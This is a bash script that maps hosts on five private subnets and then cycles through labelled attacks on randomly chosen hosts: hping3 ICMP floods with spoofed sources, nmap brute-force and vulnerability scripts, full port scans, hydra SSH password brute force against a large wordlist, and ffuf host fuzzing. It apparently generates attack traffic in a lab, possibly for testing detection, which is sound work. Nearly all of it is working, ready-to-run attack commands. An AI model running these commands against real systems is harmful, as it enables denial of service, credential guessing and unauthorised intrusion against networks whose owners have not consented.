#!/bin/bash

ap_one="192.168.50.1"
ap_two="192.168.80.1"
ap_three="192.168.100.1"
ap_four="192.168.132.1"
ap_five="192.168.140.1"

#echo "Available APs: "
#printf "a) $ap_one\nb) $ap_two\nc) $ap_three\nd) $ap_four\ne) $ap_five\n"
#echo -n "Select one of the above: "
#
#ap_choice=""
#while [[ 1 ]]; do
#  read choice
#  
#  case "$choice" in
#    a)
#      ap_choice=$ap_one
#      break
#      ;;
#    b)
#      ap_choice=$ap_two
#      break
#      ;;
#    c)
#      ap_choice=$ap_three
#      break
#      ;;
#    d)
#      ap_choice=$ap_four
#      break
#      ;;
#    e)
#      ap_choice=$ap_five
#      break
#      ;;
#    *)
#      ;;
#  esac
#  
#  printf "$choice is not an option. Select one of the APs: "
#done
#echo
#echo "Selected AP: $ap_choice"

subnet_one=`echo $ap_one | python3 -c 'import sys; inp=sys.stdin.read(); print(inp[:inp.rfind(".")])'`
subnet_two=`echo $ap_two | python3 -c 'import sys; inp=sys.stdin.read(); print(inp[:inp.rfind(".")])'`
subnet_three=`echo $ap_three | python3 -c 'import sys; inp=sys.stdin.read(); print(inp[:inp.rfind(".")])'`
subnet_four=`echo $ap_four | python3 -c 'import sys; inp=sys.stdin.read(); print(inp[:inp.rfind(".")])'`
subnet_five=`echo $ap_five | python3 -c 'import sys; inp=sys.stdin.read(); print(inp[:inp.rfind(".")])'`



echo "[*] Starting nmap hosts discovery"
hosts_one=`nmap "$subnet_one.2/24" -sn | grep -E '[1-9]{3}\.*' | awk '{print $(NF)}' - | sed 's/[a-z].*//g' | sed 's/(\(.*\))/\1/g'`
hosts_two=`nmap "$subnet_two.2/24" -sn | grep -E '[1-9]{3}\.*' | awk '{print $(NF)}' - | sed 's/[a-z].*//g' | sed 's/(\(.*\))/\1/g'`
hosts_three=`nmap "$subnet_three.2/24" -sn | grep -E '[1-9]{3}\.*' | awk '{print $(NF)}' - | sed 's/[a-z].*//g' | sed 's/(\(.*\))/\1/g'`
hosts_four=`nmap "$subnet_four.2/24" -sn | grep -E '[1-9]{3}\.*' | awk '{print $(NF)}' - | sed 's/[a-z].*//g' | sed 's/(\(.*\))/\1/g'`
hosts_five=`nmap "$subnet_five.2/24" -sn | grep -E '[1-9]{3}\.*' | awk '{print $(NF)}' - | sed 's/[a-z].*//g' | sed 's/(\(.*\))/\1/g'`
echo "[*] Finished nmap hosts discovery"

echo "[*] Press enter to begin attacks..."
read 
while [[ 1 ]]; do

  ip_choice_a=`echo $hosts_one | python3 -c 'import sys; import random; inp = sys.stdin.read(); arr = inp.split(); print(random.choice(arr))'`
  ip_choice_b=`echo $hosts_two | python3 -c 'import sys; import random; inp = sys.stdin.read(); arr = inp.split(); print(random.choice(arr))'`
  ip_choice_c=`echo $hosts_three | python3 -c 'import sys; import random; inp = sys.stdin.read(); arr = inp.split(); print(random.choice(arr))'`
  ip_choice_d=`echo $hosts_four | python3 -c 'import sys; import random; inp = sys.stdin.read(); arr = inp.split(); print(random.choice(arr))'`
  ip_choice_e=`echo $hosts_five | python3 -c 'import sys; import random; inp = sys.stdin.read(); arr = inp.split(); print(random.choice(arr))'`


  # # attack one = DoS
  echo "[*] Beginning DoS attack on ip addresses: $(date)"
  loop_count=0
  while [[ $loop_count -ne 5 ]]; do
    timeout 2 hping3 --icmp --flood --rand-source $ip_choice_a
    timeout 2 hping3 --icmp --flood --rand-source $ip_choice_b
    timeout 2 hping3 --icmp --flood --rand-source $ip_choice_c
    timeout 2 hping3 --icmp --flood --rand-source $ip_choice_d
    timeout 2 hping3 --icmp --flood --rand-source $ip_choice_e

    loop_count=$(($loop_count + 1))
  done

  echo "[*] Press enter to continue"
  read

  loop_count=0
  echo "[*] Beginning brute force nmap attack on ip addresses: $(date)"
  while [[ $loop_count -ne 2 ]]; do
    # attack two = nmap brute force
    timeout 2 nmap $ip_choice_a --script=brute
    timeout 2 nmap $ip_choice_b --script=brute
    timeout 2 nmap $ip_choice_c --script=brute
    timeout 2 nmap $ip_choice_d --script=brute
    timeout 2 nmap $ip_choice_e --script=brute

    loop_count=$(($loop_count + 1))
  done

  echo "[*] Press enter to continue"
  read
  echo "[*] Beginning netscan attack on ip addresses: $(date)"
  loop_count=0
  while [[ $loop_count -ne 2 ]]; do
    # attack three = network discovery
    nmap $ap_one/24 -sn
    nmap $ap_two/24 -sn
    nmap $ap_three/24 -sn
    nmap $ap_four/24 -sn
    nmap $ap_five/24 -sn

    loop_count=$(($loop_count + 1))
  done

  echo "[*] Press enter to continue"
  read

    echo "[*] Beginning vulnerability attack on ip addresses: $(date)"
    # attack four = vulnerability discovery
    timeout 50 nmap $ip_choice_a --script=vuln -Pn
    timeout 50 nmap $ip_choice_b --script=vuln -Pn
    timeout 50 nmap $ip_choice_c --script=vuln -Pn
    timeout 50 nmap $ip_choice_d --script=vuln -Pn
    timeout 50 nmap $ip_choice_e --script=vuln -Pn

  echo "[*] Press enter to continue"
  read

  echo "[*] Beginning Port Scan attack on ip addresses: $(date)"
  # attack five = Port Scan
  timeout 5 nmap 192.168.50.2/24 -p-
  timeout 5 nmap 192.168.80.2/24 -p-
  timeout 5 nmap 192.168.100.2/24 -p-
  timeout 5 nmap 192.168.132.2/24 -p-
  timeout 5 nmap 192.168.140.2/24 -p-

  echo "[*] Press enter to continue"
  read

  echo "[*] Beginning hydra attack on ip addresses: $(date)"
  # attack six = medusa/hydra brute force - should be functionalizing this and looping
  rm ./hydra.restore
  timeout 5 hydra -l admin -P /home/aird/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt ssh://$ip_choice_a 
  rm ./hydra.restore
  timeout 5 hydra -l admin -P /home/aird/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt ssh://$ip_choice_b
   rm ./hydra.restore
  timeout 5 hydra -l admin -P /home/aird/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt ssh://$ip_choice_c
   rm ./hydra.restore
  timeout 5 hydra -l admin -P /home/aird/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt ssh://$ip_choice_d
   rm ./hydra.restore
  timeout 5 hydra -l admin -P /home/aird/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt ssh://$ip_choice_e


  echo "[*] Press enter to continue"
  read


  echo "[*] Beginning Fuzzing attack on ip addresses: $(date)"
  # attack seven = Fuzzing
  ffuf -w /home/aird/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://$ip_choice_a -H "Host: FUZZ"
  ffuf -w /home/aird/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://$ip_choice_b -H "Host: FUZZ"
  ffuf -w /home/aird/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://$ip_choice_c -H "Host: FUZZ"
  ffuf -w /home/aird/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://$ip_choice_d -H "Host: FUZZ"
  ffuf -w /home/aird/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://$ip_choice_e -H "Host: FUZZ"


done


